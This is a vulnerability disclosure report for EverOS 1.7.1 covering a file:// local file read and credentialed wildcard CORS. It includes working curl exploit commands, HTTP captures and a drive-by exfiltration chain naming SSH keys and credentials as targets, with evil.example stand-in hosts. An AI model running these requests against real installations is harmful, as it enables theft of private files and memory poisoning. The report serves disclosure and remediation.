# EverOS 1.7.1 — Unauthenticated local file read via `file://` content URI and credentialed wildcard CORS

## Report metadata

| Field | Value |
|---|---|
| Target | EverOS 1.7.1 (Python/FastAPI), commit `e5778edb4cbac71e359ea375f38cf805aae32b0c` |
| Engagement dir | `/home/teycir/BugBounty/everos/20261120/153647` |
| Generated (UTC) | 2026-11-20T15:37:25Z |
| Re-verified (UTC) | 2026-11-20T15:46:36Z |
| Scope | Disposable local lab: `127.0.0.1:18777`, root `/tmp/opencode/everos-lab`, plus `18778` for the allowlist control. No external systems touched. |
| Status | FINAL |

## 1. Executive Summary

### 1.1 Background
EverOS is a local-first agent-memory service. Its `SECURITY.md` declares "HTTP API exposure to untrusted network" out of scope and documents that the API has no built-in authentication. The objective was to test whether that threat model survives a browser: an arbitrary web page is not "the network", but it can issue credentialed requests to `127.0.0.1`.

Two independent defaults combine into full local-file exfiltration:

1. `POST /api/v2/memory/add` accepts a `ContentItem` with `uri: file:///...`. With the default `file_uri_allow_dirs = []`, any file readable by the EverOS process is hydrated and its parsed text is stored (`parsed_content`) and returned by the search API.
2. CORS defaults are `allow_origins=["*"]` **and** `allow_credentials=True`. Starlette reflects every `Origin` and returns `Access-Control-Allow-Credentials: true`, so any website can call the unauthenticated API and read the responses.

Result: a victim visiting a malicious page can have arbitrary local files (up to 50 MB) read and exfiltrated, and attacker-chosen memory written.

### 1.2 Overall Posture
The issues are default-configuration and design-boundary failures, not memory-safety bugs:

- The file-read primitive is implemented deliberately for local-first ingestion, but the default empty allowlist means "any readable path". The guard works when configured; it is simply off by default.
- The CORS policy is internally contradictory: a wildcard origin with credentials is invalid per the Fetch spec; Starlette's implementation resolves it by reflecting the origin, which defeats the wildcard's intended restriction.
- No authentication is intentional, so CORS becomes the only boundary between a browser page and the local API — and it is open.

### 1.3 Risk Profile

| Severity | Count | Findings |
|---|---|---|
| Critical | 0 | — |
| High | 2 | RT-01, RT-02 |
| Medium | 0 | — |
| Low | 0 | — |
| Informational | 1 | Conditional-on-config note (RT-01) |

Overall risk: **High**. RT-01 is CVSS 7.5 standalone; RT-02 is CVSS 8.2 and is the delivery vehicle that removes the need for local access to RT-01.

### 1.4 Recommendation Summary

| Priority | Action | Finding |
|---|---|---|
| P0 | Default CORS to no origins and `allow_credentials=False`; require an explicit origin allowlist and a per-instance bearer token for all write/read routes. | RT-02 |
| P0 | Default `file_uri_allow_dirs` to the EverOS data root (deny all when unset); require explicit opt-in for host paths; resolve symlinks before the check. | RT-01 |
| P1 | Do not return raw `parsed_content` or content bytes in search/list DTOs; return references only. | RT-01 |
| P1 | Reject `Origin: null` and non-allowlisted origins before routing. | RT-02 |
| P2 | Separate the parser into a lower-privilege worker with its own filesystem view. | RT-01 |

## 2. Scope & Methodology

- In-scope assets: local EverOS 1.7.1 instance started from the supplied repository; loopback ports 18777/18778.
- Constraints / rules of engagement: disposable lab root under `/tmp/opencode`; non-destructive testing against external systems (none contacted). The only writes were memory records in the disposable lab.
- Methodology (PTES): source review → configuration review → live exploitation → negative controls → reporting.
- Prerequisites: Python 3.12, `uv`, repository checkout; `[llm]` configured (required to boot); `[multimodal]` configured for RT-01 (parser enabled). The stub LLM base URL was never contacted for `txt` because `Modality.DIRECT` decodes bytes without an LLM call.

## 3. Findings Summary

| ID | Severity | CVSS 3.1 | CWE | Title | Status |
|----|----------|----------|-----|-------|--------|
| RT-01 | High | 7.5 | CWE-73 | Arbitrary local file read via `file://` content URI in `/memory/add` | Verified |
| RT-02 | High | 8.2 | CWE-942 / CWE-306 | Credentialed wildcard CORS on an unauthenticated local API | Verified |

## 4. Findings Detail

### RT-01 — Arbitrary local file read via `file://` content URI in `/memory/add`

- **Severity:** High
- **CVSS 3.1:** 7.5 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` — https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **CWE:** CWE-73 (External Control of File Name or Path); CWE-22 (Path Traversal)
- **Affected URL/Area:** `POST /api/v1/memory/add` and `POST /api/v2/memory/add`; read-back via `POST /api/v1|v2/memory/search`
- **Difficulty to exploit:** Low
- **Authentication required:** No
- **User interaction required:** No for direct API; Yes when delivered via RT-02
- **Verified at (UTC):** 2026-11-20T15:35:09Z (capture), 2026-11-20T15:37:25Z (PoC re-run)

#### Issue Description
`ContentItemDTO` accepts `uri` for non-text items (`src/everos/entrypoints/api/schemas/memorize.py:33-44`). During ingest, `enrich_content_items` parses every non-text item and backfills `parsed_content` (`src/everos/memory/extract/parser/enrich.py`). The parser builder hydrates `file://` URIs from the host filesystem.

The only guard is `file_uri_allow_dirs`. Its default is an empty list (`src/everos/config/settings.py:598`), and the implementation treats empty as "allow any readable path". The size cap is 50 MB (`settings.py:601`). Consequently, a request can read any file the EverOS process can read, e.g. `/etc/hostname`, `~/.bashrc`, `~/.ssh/*`, cloud credentials, or application secrets.

For plain text (`ext: "txt"`) the parser dispatches to `Modality.DIRECT` and UTF-8-decodes the bytes inline; no LLM call is made. A configured `[multimodal]` client is still required because `aparse_file` rejects `llm=None`, but any placeholder/dummy client suffices. This makes the primitive usable wherever the optional parser/multimodal feature is enabled.

The parsed content persists and is returned verbatim by the search endpoint (`UnprocessedMessageDTO.content[].parsed_content`).

#### Attack Scenario
1. Victim runs EverOS locally with the documented default configuration and the multimodal parser enabled.
2. Victim visits an attacker-controlled page (or any page with an injected script).
3. Script POSTs a `doc` item with `uri: "file:///home/victim/.ssh/id_rsa"` and `defer_extraction: true` to `http://127.0.0.1:18777/api/v2/memory/add`.
4. Server reads the file as the victim user, parses it, stores it in the session.
5. Script POSTs `/api/v2/memory/search` with its own random `session_id` and reads `parsed_content` from the JSON response (CORS permits this — RT-02).
6. Script exfiltrates the content to an attacker collector.

No authentication, no CSRF token, no origin restriction, and no user prompt are involved beyond visiting the page.

#### Steps to Reproduce / PoC
Prerequisites: disposable EverOS root, `[llm]` and `[multimodal]` configured (dummy values are fine for `txt`), server on loopback.

1. Start the server:

```bash
cd /home/teycir/ResearchAIRedTeam/EverOS
EVEROS_LLM__API_KEY=sk-dummy EVEROS_LLM__BASE_URL=http://127.0.0.1:18999/v1 \
EVEROS_MULTIMODAL__API_KEY=sk-dummy EVEROS_MULTIMODAL__BASE_URL=http://127.0.0.1:18999/v1 \
uv run everos server start --root /tmp/opencode/everos-lab --port 18777
```

2. Submit a `file://` content item (the Origin header is irrelevant to RT-01 but shows the browser path):

```bash
curl -s -X POST http://127.0.0.1:18777/api/v2/memory/add \
  -H 'Content-Type: application/json' -H 'Origin: https://evil.example' \
  -d '{"session_id":"report-poc-1","messages":[{"sender_id":"u1","role":"user","timestamp":1795188909538,"content":[{"type":"doc","name":"hostname.txt","uri":"file:///etc/hostname","ext":"txt"}]}],"defer_extraction":true}'
```

3. Read the stored parsed bytes back:

```bash
curl -s -X POST http://127.0.0.1:18777/api/v2/memory/search \
  -H 'Content-Type: application/json' -H 'Origin: https://evil.example' \
  -d '{"user_id":"attacker","query":"hostname","method":"keyword","filters":{"session_id":"report-poc-1"}}'
```

4. Or run the packaged PoC:

```bash
python3 pocs/everos_file_read.py --file file:///etc/hostname --session final-poc-1
```

5. For the browser chain, serve `pocs/driveby.html`, start `pocs/exfil_listener.py`, and open:

```
http://attacker.test:8000/driveby.html?file=file:///etc/hostname
```

#### Request
```http
POST /api/v2/memory/add HTTP/1.1
Host: 127.0.0.1:18777
Content-Type: application/json
Origin: https://evil.example

{"session_id":"report-poc-1","messages":[{"sender_id":"u1","role":"user","timestamp":1795188909538,"content":[{"type":"doc","name":"hostname.txt","uri":"file:///etc/hostname","ext":"txt"}]}],"defer_extraction":true}
```

#### Response
```http
HTTP/1.1 200 OK
date: Fri, 20 Nov 2026 15:35:09 GMT
content-type: application/json
access-control-allow-origin: https://evil.example
access-control-allow-credentials: true
x-request-id: 3460d9a6944949879ebc513a43e058ac

{"request_id":"3460d9a6944949879ebc513a43e058ac","data":{"message_count":1,"status":"accumulated"}}
```

Read-back response (excerpt):

```json
{
  "request_id": "c1e325480a864b23b9cf98dee989e3e4",
  "data": {
    "unprocessed_messages": [{
      "id": "m_report-poc-1_1795188909538_5c703457",
      "session_id": "report-poc-1",
      "sender_id": "u1",
      "content": [{
        "type": "doc",
        "uri": "file:///etc/hostname",
        "name": "hostname.txt",
        "ext": "txt",
        "parsed_content": "teycir-G5-KF5\n",
        "parse_status": "success"
      }],
      "timestamp": "2026-11-20T15:35:09.538000Z"
    }]
  }
}
```

#### Evidence artifacts
- `evidence/add.headers`, `evidence/add.body` — request acceptance and request ID.
- `evidence/search.headers`, `evidence/search.body` — leaked `parsed_content`.
- `evidence/poc_run.txt` — independent PoC re-run against `/etc/hostname`.
- `evidence/add_allowlist_blocked.body` — control: with an allowlist configured, `/etc/hostname` is rejected (`UNSUPPORTED_FORMAT`, HTTP 415).
- `evidence/search_allowed_canary.body` — control: a file inside the allowed root is parsed (`ALLOWED-CANARY-9d2f`).
- `evidence/browser_dom.txt`, `evidence/driveby_exfil.json`, `evidence/exfil_listener.log` — full browser chain executed at 2026-11-20T15:39:14Z with headless Chromium 157: page origin `http://127.0.0.1:8000` read `teycir-G5-KF5\n` from `http://127.0.0.1:18777` and POSTed 690 bytes to the collector on `:8899`.
- `evidence/browser_dom_evil.txt`, `evidence/driveby_exfil_evil.json`, `evidence/exfil_listener_evil.log` — hardened re-run at 2026-11-20T15:46:36Z from a non-loopback origin `http://evil.example:8000` (Chromium `--host-resolver-rules='MAP evil.example 127.0.0.1'`). Exfil records `"origin":"http://evil.example:8000"` and `"parsed":"teycir-G5-KF5\n"`; 854 bytes received.
- `evidence/add_allowlist_symlink_etc.body`, `evidence/add_allowlist_symlink_out.body`, `evidence/add_allowlist_dotdot.body`, `evidence/add_allowlist_localhost.body` — guard controls: with an allowlist set, symlink to `/etc/hostname`, symlink outside the root, `..` traversal, and `file://localhost/...` are all rejected (HTTP 415). `Path.resolve(strict=True)` plus `is_relative_to` holds.
- `evidence/add_unreadable.body`, `evidence/add_unreadable.status` — negative control: `/etc/shadow` yields HTTP 500, no content.
- `evidence/config_defaults.txt` — `file_uri_allow_dirs` default `[]`.
- Other files and SHA256 in §5.1.

#### Impact
An attacker who can reach the API (directly, or via a victim's browser through RT-02) can read any file the EverOS process can access, up to 50 MB per item, subject only to OS permissions and the empty-by-default allowlist. That includes SSH private keys, cloud credentials, shell history, source code, and application configuration. In the browser chain, the victim's files are exfiltrated without any prompt. Integrity impact is none for this finding; confidentiality impact is high. The parser must be enabled (`[multimodal]` configured), which is a documented optional feature, not a default-on requirement to boot.

#### Affected Demographic
Operators running EverOS locally with the multimodal parser enabled — developers and agent users on laptops/workstations, i.e. the primary user base of a local-first memory product.

#### Recommended Fix
- Change the default to deny: when `file_uri_allow_dirs` is empty, reject all `file://` URIs; require explicit opt-in directories.
- Resolve real paths and symlinks before the allowlist check; compare path components, not string prefixes.
- Do not hydrate `file://` from the API request path; restrict host-file ingestion to a local CLI/import command.
- Remove `parsed_content` from search/list DTOs or gate it behind an authenticated, same-process interface.
- Defense in depth: run the parser as a separate unprivileged worker with a restricted filesystem view.

#### References
- CWE-73: https://cwe.mitre.org/data/definitions/73.html
- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- OWASP WSTG — Testing for Path Traversal: https://owasp.org/www-project-web-security-testing-guide/
- OWASP File Upload Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

---

### RT-02 — Credentialed wildcard CORS on an unauthenticated local API

- **Severity:** High
- **CVSS 3.1:** 8.2 — `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` — https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
- **CWE:** CWE-942 (Permissive Cross-domain Policy with Untrusted Domains); CWE-306 (Missing Authentication for Critical Function)
- **Affected URL/Area:** all `/api/v1/*` and `/api/v2/*` routes, especially `POST /memory/add` and `POST /memory/search`
- **Difficulty to exploit:** Low
- **Authentication required:** No
- **User interaction required:** Yes (victim opens a page)
- **Verified at (UTC):** 2026-11-20T15:35:09Z (preflight and cross-origin read), 2026-11-20T15:34:42Z (ownership check)

#### Issue Description
`app.py` installs `CORSMiddleware` with `allow_credentials=DEFAULT_CORS_ALLOW_CREDENTIALS` (`src/everos/entrypoints/api/app.py:63`) and the defaults are:

```
src/everos/entrypoints/api/middleware/cors.py:9   DEFAULT_CORS_ALLOW_CREDENTIALS = True
src/everos/entrypoints/api/middleware/cors.py:12  DEFAULT_CORS_ORIGINS = ["*"]
```

Starlette cannot satisfy wildcard + credentials literally, so it reflects the request `Origin` and sets `Access-Control-Allow-Credentials: true`. That converts the wildcard into "allow every origin, with credentials". The API has no authentication by design, so any web page can invoke it with the victim's local privileges.

The search endpoint also does not bind `unprocessed_messages` to the supplied `user_id`: a request with `user_id: "attacker"` returned a row owned by `sender_id: "u1"` when the `session_id` matched. Thus a known or guessed session ID is sufficient to read that session's buffered content.

#### Attack Scenario
1. Victim visits `https://evil.example/poc.html`.
2. Page JS sends a preflighted `POST` to `http://127.0.0.1:18777/api/v2/memory/add` with `Content-Type: application/json`. Preflight succeeds because the server reflects `https://evil.example` and allows the header.
3. Page JS sends `POST /api/v2/memory/search` and reads the JSON response cross-origin.
4. Without RT-01, the page can read any session whose ID it knows or guesses and can write attacker-controlled memory (poisoning future agent context).
5. With RT-01, the page chooses its own session, reads an arbitrary local file, and exfiltrates it — no knowledge of victim session IDs needed.

#### Steps to Reproduce / PoC
1. Start the server as in RT-01 (or any running instance; `[llm]` is enough for RT-02).
2. Send a preflight:

```bash
curl -i -X OPTIONS http://127.0.0.1:18777/api/v2/memory/search \
  -H 'Origin: https://evil.example' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: content-type'
```

3. Send a cross-origin search and observe the reflected ACAO/ACAC headers plus the data.
4. Serve `pocs/driveby.html` and open it from a different origin to execute the chain in a browser.

#### Request
```http
OPTIONS /api/v2/memory/search HTTP/1.1
Host: 127.0.0.1:18777
Origin: https://evil.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
```

#### Response
```http
HTTP/1.1 200 OK
date: Fri, 20 Nov 2026 15:35:09 GMT
vary: Origin
access-control-allow-methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
access-control-max-age: 600
access-control-allow-credentials: true
access-control-allow-origin: https://evil.example
access-control-allow-headers: content-type
content-length: 2
```

Cross-origin read (excerpt; `user_id` deliberately set to `attacker`, row owned by `u1`):

```json
{
  "request_id": "c1e325480a864b23b9cf98dee989e3e4",
  "data": {
    "unprocessed_messages": [{
      "session_id": "report-poc-1",
      "sender_id": "u1",
      "content": [{"uri": "file:///etc/hostname", "parsed_content": "teycir-G5-KF5\n"}]
    }]
  }
}
```

#### Evidence artifacts
- `evidence/preflight.headers`, `evidence/preflight.body` — preflight reflection.
- `evidence/search.headers`, `evidence/search.body` — reflected ACAO/ACAC on the data response.
- `evidence/search_cross_user.body`, `evidence/search_cross_user.headers` — victim session `victim-private-1` created as `sender_id: u1` (`sender_name: "victim"`) and read with `user_id: "attacker"`; response contains `VICTIM-SECRET-4f9a2c` and `sender_name: "victim"`.
- `evidence/origin_null.headers`, `evidence/origin_null.body` — `Origin: null` is reflected as `access-control-allow-origin: null` with credentials, so a local `file://` HTML page can also attack the API.
- `evidence/driveby_exfil_evil.json` — browser-observed origin `http://evil.example:8000`, not loopback.
- `evidence/cors_defaults.txt` — wildcard origin + credentials default.
- `evidence/search_unknown_session.body` — control: unknown session returns an empty list.
- `evidence/add_unreadable.body`, `evidence/add_unreadable.status` — control: `/etc/shadow` returns HTTP 500 with a generic error and no content.
- `pocs/driveby.html`, `pocs/exfil_listener.py` — end-to-end browser PoC and receiver.

#### Impact
Any website the victim visits can read and write the local EverOS API. Read impact includes all memory content in sessions whose IDs are known or discoverable, plus (via RT-01) arbitrary local files. Write impact includes planting attacker-controlled memories that later steer agent behavior (prompt injection/persistence). The victim does not need to install anything or approve a prompt. Confidentiality is high; integrity is low-to-medium (memory poisoning, no code execution demonstrated).

#### Affected Demographic
All EverOS users who run the HTTP API and visit web pages in the same machine/browser profile; the default configuration requires no deviation.

#### Recommended Fix
- Set `DEFAULT_CORS_ORIGINS = []` and `DEFAULT_CORS_ALLOW_CREDENTIALS = False`; require both to be configured explicitly.
- If a browser UI is needed, bind an allowlist to exact origins and add a per-instance bearer token that the UI must present; never rely on loopback binding as authorization.
- Reject `Origin: null`; do not reflect arbitrary origins.
- Bind `unprocessed_messages` to the authenticated owner and verify `user_id`/`session_id` ownership server-side.
- Add a CSRF-style header that cross-origin forms cannot set without a preflight, and require it on all mutating routes even after CORS tightening.

#### References
- CWE-942: https://cwe.mitre.org/data/definitions/942.html
- CWE-306: https://cwe.mitre.org/data/definitions/306.html
- OWASP CSRF: https://owasp.org/www-community/attacks/csrf
- Fetch Living Standard — CORS protocol: https://fetch.spec.whatwg.org/#http-cors-protocol

## 5. Appendix

### 5.1 Evidence inventory

| Path | SHA256 |
|---|---|
| `evidence/add.headers` | `c326e1a2fa86eadafb84d0aa7e00c08376d031df532b8f2eabc8a1d25dce86e1` |
| `evidence/add.body` | `ee626c7730b507040380b35249d31d5870b7aa4db5fe8153b31759f1fac527b8` |
| `evidence/search.headers` | `ea3b5305e545cf138924ebe1698004ba12da9350616ecc8997aa7d564c66bd7d` |
| `evidence/search.body` | `b77c4ac65839fc98dc2028640a080bd68dcea9e9e0004041f9bfedb4d484b386` |
| `evidence/preflight.headers` | `5c5e530593d0a073f0b584f82a1456ddb83fd31d515130c28beefb262e06ca49` |
| `evidence/preflight.body` | `565339bc4d33d72817b583024112eb7f5cdf3e5eef0252d6ec1b9c9a94e12bb3` |
| `evidence/search_unknown_session.body` | `5d951f183c7d955d60095977128475569cec880b17a8e72c23932c6d15e64d1a` |
| `evidence/add_unreadable.body` | `c18182b8b66a90a40bc477eecc9800583ad1b47f77f2fed024bb193fa393c677` |
| `evidence/add_unreadable.status` | `0604cd3138feed202ef293e062da2f4720f77a05d25ee036a7a01c9cfcdd1f0a` |
| `evidence/add_allowlist_blocked.body` | `2e383fba99b0277f6b01c39ee374d850bfdb94e16ab12ed4912b4c575f341021` |
| `evidence/search_allowed_canary.body` | `b3787aa47b2cc853d52e5611a15765b124d12454439abbf4b950a7fa3241eb31` |
| `evidence/config_defaults.txt` | `b51ba228ced60b2b3dbba9cae41d83a0937b13226c5c729d20fa2186c5ad3c84` |
| `evidence/cors_defaults.txt` | `6cd8342b6a2c1814cbbda252ba5d71b06ecb40fb4341797f8fc14b24dac700d6` |
| `evidence/git_head.txt` | `ae08bd8b7733880465a34a5c38907299e337f72aabafd51565a482445ff9f7c5` |
| `evidence/poc_run.txt` | `b59b6bbad15fe4aeb181b7d453ea96f8c6709a499bbd33556a3152e7d1165abe` |
| `evidence/browser_dom.txt` | `47e279ec51d2023e2d83a7cd6b067ade521a0250c9ec7cdfceae3f8b931a0f84` |
| `evidence/browser_chrome.log` | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` |
| `evidence/exfil_listener.log` | `a05095936e855c77298a37fa8f505f742e2ea2bd61a7e594418a837023d6d669` |
| `evidence/driveby_exfil.json` | `2227ea828e8a4a43ac8cda795ad92c8f084a1e453363865c45acc4056969568e` |
| `evidence/browser_dom_evil.txt` | `46c18664e550c6bacfef49fbbeb51844fa34ddc4bc72755cd3d742eb3a248ef6` |
| `evidence/browser_evil.log` | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` |
| `evidence/exfil_listener_evil.log` | `1ed775b61428e7ab3783301a304b4249e354b36c1e3305d92855e8434da11c42` |
| `evidence/driveby_exfil_evil.json` | `ed9fa620917fa3f54366cb538687e9a24e012261cbbcf392def2828ef48b5571` |
| `evidence/search_cross_user.body` | `46e6aa1d772ee11a15258b1c5f9929400c319dd8356dc9959230e169307a7f1a` |
| `evidence/search_cross_user.headers` | `ac852a4a2f792f7a3112e0abbd08664f91e2c648203ea5cc955d1d9a821feb7d` |
| `evidence/origin_null.headers` | `04fe3506fa7e142c3eec62da2ee88bbffc962779d0b1f316c93d31c26033563d` |
| `evidence/origin_null.body` | `ca895b10b18a06fa14accfe7241432b601caac1cb146876cf900ce227d05fcff` |
| `evidence/add_allowlist_symlink_etc.body` | `784625b06f9e26298843ca7be1f772f3453216bdc47f9750a5bef1cbf552e3c3` |
| `evidence/add_allowlist_symlink_out.body` | `7478ad089a887585e26a053f3716b04a6a550157060fed231432c0964d943b8e` |
| `evidence/add_allowlist_dotdot.body` | `7300c5f0de27f53694c27b6503070362f0250614ca5a3b1c66e319316e91b9fc` |
| `evidence/add_allowlist_localhost.body` | `d153b99f4b77ad71495107f26ca58aca4f7ea986a455fa67866cce5f9e1f8fd6` |
| `evidence/captured_at.txt` | `445db7267753c37f74b40c784cc2ceec9e8ddfab970dff5b3e53e78afb78c988` |
| `pocs/everos_file_read.py` | `2e523557a1e8bb4c079fd777960a8addab4fafa7102c6602e0a73263702fdae3` |
| `pocs/driveby.html` | `1844e7f06c188a9d2aefd849f3a1cd24df1f0530c0b7cd67956b5b86ee30adde` |
| `pocs/exfil_listener.py` | `65e8cce55440d1ac7b60c135e4e1afb0c2bae95a21b4b273fc295c11c423b824` |
| `pocs/add_file_uri.json` | `1107765f4d69ccd46e2f7830fe05a9aec8529058ce3ce6cbbac7c8cdaa9e9a72` |
| `pocs/search_readback.json` | `b636791832122eed7d230da33ad73de360e618d70924c7ed3d9bd71fb3a1b43f` |
| `pocs/add_unreadable.json` | `d388730137709f8337849cef8e2c0fa24894a84de775ed3b998ac912a0b84a33` |
| `pocs/search_unknown_session.json` | `078693ecb750af09d6c8c46f81e1458fbf459edb3a9f7b643c9ed55dd4214777` |

### 5.2 Tools used
- EverOS 1.7.1 (`uv run everos server start`), Python 3.12.3.
- `curl` 8.5.0 (libcurl/OpenSSL 3.0.13).
- `sha256sum`, `git`.
- PoC scripts in `pocs/` are self-contained (urllib + http.server).

### 5.3 Falsified / refuted items
- **"Wildcard CORS is harmless because the API is loopback-only."** Refuted: the response reflects arbitrary origins and allows credentials; a browser page can read responses. Verified live.
- **"`file://` read requires a fully working multimodal LLM."** Refuted for `txt`: the parser routes to `Modality.DIRECT` and decodes bytes without any LLM call; only a non-`None` client is required to pass the wrapper check. Verified with a dummy base URL and real file content returned.
- **"The allowlist fully prevents host reads."** Partially refuted as a default claim: the guard works when set (control: `/etc/hostname` rejected, allowed canary parsed), but the default empty list allows any readable path.
- **"Unreadable files leak via error."** Refuted: `/etc/shadow` returned a generic HTTP 500 with no content.
- **"Search requires the correct user_id."** Refuted: with `user_id: attacker`, the response still returned a row whose `sender_id` was `u1` when the session ID matched.
- **"Symlink/traversal escapes the allowlist."** Refuted when the allowlist is set: symlink to `/etc/hostname`, symlink to a file outside the root, `..` traversal, and `file://localhost/...` all returned HTTP 415. The default empty allowlist remains the finding.
